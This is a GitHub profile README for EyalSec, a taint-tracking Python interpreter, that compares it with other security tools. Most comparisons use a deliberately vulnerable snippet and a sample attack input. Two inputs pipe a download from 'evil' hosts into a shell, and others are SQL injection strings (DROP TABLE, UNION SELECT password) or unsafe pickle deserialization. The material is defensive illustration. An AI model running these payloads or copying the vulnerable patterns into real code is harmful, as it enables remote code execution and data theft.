![EyalSec - a secure Python](https://raw.githubusercontent.com/EyalSec/.github/main/profile/banner.png)

# EyalSec

**The Python you already run, watching for attacks as your code executes.**

[![Website](https://img.shields.io/badge/website-eyalsec.com-e8b04b)](https://eyalsec.com)
[![Docs](https://img.shields.io/badge/docs-user%20guide-2a2c27)](https://eyalsec.com/docs)

EyalSec is a security-hardened build of Python, `es-python`. You install it next
to your normal Python and run your existing programs and libraries through it
unchanged. As your code runs, EyalSec watches for untrusted data reaching a
risky action, and either reports it to your dashboard or blocks it before it
runs.

That untrusted-data-reaches-a-sink pattern is how most real-world attacks work:
SQL injection, command injection, path traversal, and insecure deserialization.
EyalSec has already flagged two critical CVEs in Django.

## How it works

- **Source** - where untrusted data enters: a network socket, a file, standard
  input, environment variables and command-line arguments, or code another user
  can write.
- **Sink** - a risky action it flows into: running a system command, opening a
  file, running a database query, or deserializing data.
- **Report, or Report and Raise** - chosen per machine. Report logs the event to
  your dashboard and lets the program continue. Report and Raise does both: it
  logs the event **and** stops the risky action before it runs, so an attack is
  blocked, not just recorded.

Your source code and files never leave the machine. Only the detection event is
sent to your dashboard: the sink that fired, the stack trace, where the data
came from, and the data that triggered it.

## What EyalSec can find that others can't

Other tools read your source and guess, watch the network edge, or restrict
syscalls. EyalSec *is* the interpreter, so it follows untrusted data all the way
to the dangerous call, on every code path, whether or not an HTTP request, a
scanner, or a crash ever exposes it. Here is where each class of tool falls
short, with a Python example EyalSec catches and they don't.

| Category | What they do | Where they fall short | EyalSec's edge |
|----------|--------------|-----------------------|----------------|
| **RASP** | Hook the app to match request payloads against dangerous calls | Loses the input once it's split, sliced, or rejoined | Follows the taint through *every* string transform to the sink |
| **WAF / edge** | Pattern-match malicious HTTP at the network boundary | Injection that never rides HTTP, a file or queue feed | Taints *every* input channel, not just the HTTP edge |
| **SAST** | Statically scan source for risky patterns | Which flagged path is *really* exploitable | Fires only when live taint hits a sink |
| **DAST / fuzzing** | Probe a running app from outside / fuzz inputs | Sinks on branches it never reaches | Taint-guided fuzzing hits *every* branch |
| **SCA / dependency** | Flag known-CVE dependencies | Unknown vulns; whether the CVE is truly hit | Confirms attacker data reaches the CVE |
| **Sandboxing / isolation** | Restrict syscalls / isolate the process | App-level injection (sees only syscalls) | Tracks app-level taint to the sink |
| **EDR / runtime threat** | Detect malicious behavior at the OS/host level | The exploit *before* it fires | Flags tainted data before the call |

### RASP

RASP inspects the request, but not what the app does to it next:

```python
msg = sock.recv(4096).decode()      # request body -> tainted
arg = " ".join(msg.split()[1:])     # split, slice, rejoin -> still tainted
# attacker sends:  ping x; curl evil.sh | sh
os.system("traceroute " + arg)      # SINK -> es-python raises
```

**Why RASP misses:** RASP flags a call only when its argument still matches a
payload it logged from the request. The app splits, slices, and rejoins that
input first, so the bytes reaching `os.system` match nothing RASP saw. es-python
taints the data itself, so the mark rides through every transform to the sink.

### WAF / edge

A CSV dropped by an SFTP partner feed never crosses the edge:

```python
row = open("/inbox/orders.csv").readline()   # file bytes -> tainted; the WAF never saw them
# attacker planted a row:  '; DROP TABLE users; --
db.execute("SELECT * FROM t WHERE id='" + row + "'")   # SINK -> es-python raises
```

**Why WAF / edge misses:** the record arrives as a file from a batch drop, never
over HTTP, so the edge has no packet to inspect. es-python taints every input
channel, files included, so the bytes stay marked all the way to the SQL sink.

### SAST

The sink is chosen by a runtime key, so static dataflow loses it:

```python
ACTIONS = {"copy": shutil.copy, "run": os.system, "stat": os.stat}
name, arg = sock.recv(4096).decode().split(":", 1)   # socket -> tainted
# attacker sends:  run:reboot; curl evil | sh
ACTIONS[name](arg)         # callable resolved at runtime -> SINK -> es-python raises
```

**Why SAST misses:** which callable `ACTIONS[name]` resolves to is a runtime
value; a static engine can't prove the tainted `arg` reaches `os.system`.
es-python sees the *actual* call.

### DAST / fuzzing

A successful SQL injection that never crashes:

```python
expr = sock.recv(4096).decode()   # socket -> tainted
# expr = 1=1 UNION SELECT password FROM admins
db.execute("SELECT * FROM logs WHERE " + expr)   # returns rows, exits 0 -> SINK
```

**Why DAST / fuzzing misses:** the query runs cleanly and returns rows, zero crash
signal for a coverage fuzzer, which records a "pass". es-python flags the
injection semantically, no crash required.

### SCA / dependency

Your own deserialization bug, which no third-party advisory describes:

```python
cookie = sock.recv(4096)   # cookie arrives over the wire -> tainted
pickle.loads(cookie)   # SINK -> es-python raises
```

**Why SCA / dependency misses:** SCA matches your lockfile against a CVE database.
A deserialization bug you wrote yourself is in no advisory feed, so it stays
silent. es-python catches the live tainted-bytes to `pickle.loads` flow.

### Sandboxing / isolation

The sandbox must permit `execve` for the legitimate dump, which lets the injected
command through too:

```python
subprocess.run(["/usr/bin/pg_dump", "mydb"])       # legitimate, must be allowed
name = sock.recv(4096).decode()   # socket -> tainted
subprocess.run("tar czf /tmp/" + name + ".tgz /data", shell=True)   # SINK
```

**Why Sandboxing / isolation misses:** seccomp/gVisor decide per syscall; to allow
`pg_dump` they must permit `execve`, which lets the injected `tar; ...` through
too. es-python gates only the *tainted* exec and leaves the clean one alone.

### EDR / runtime threat

es-python raises before any payload executes:

```python
blob = sock.recv(65536)    # socket -> tainted
pickle.loads(blob)  # SINK -> raises before the gadget detonates
```

**Why EDR / runtime threat misses:** EDR detects malicious *behavior* after the
fact, a spawned shell or a beacon. es-python raises *before* the pickle gadget
runs, so there is no behavior left for the EDR to observe.

## Install

Sign in, add a machine on your dashboard, and run the one-line installer it
gives you. `es-python` installs next to your normal Python; then run your program
through it, no code changes. Full guide: **[eyalsec.com/docs](https://eyalsec.com/docs)**.

## Questions

**How is it different from a static scanner or linter?** A static scanner reads
your source and guesses at possible bugs before it runs. EyalSec watches real
execution and only reports untrusted data that actually reaches a risky action,
so it finds real, exploitable issues with far fewer false positives.

**Do I have to change my code?** No. `es-python` runs your existing code,
frameworks, and packages exactly as they run today.

**Does it work with Django, Flask, and my libraries?** Yes. Your frameworks and
packages run unchanged.

**Does it send my code anywhere?** No. Your source and files stay on the
machine; only the detection event posts to your dashboard.

## Explore

- **[Website](https://eyalsec.com)** - what EyalSec does and how it installs
- **[Documentation](https://eyalsec.com/docs)** - install, run, read events, configure rules
- **[Pricing](https://eyalsec.com/pricing)** - size machines and monthly events for a price
- **[Security](https://eyalsec.com/security)** - the security model; your code stays on your machine

---

Python is a trademark of the Python Software Foundation. EyalSec is not
affiliated with or endorsed by the PSF.
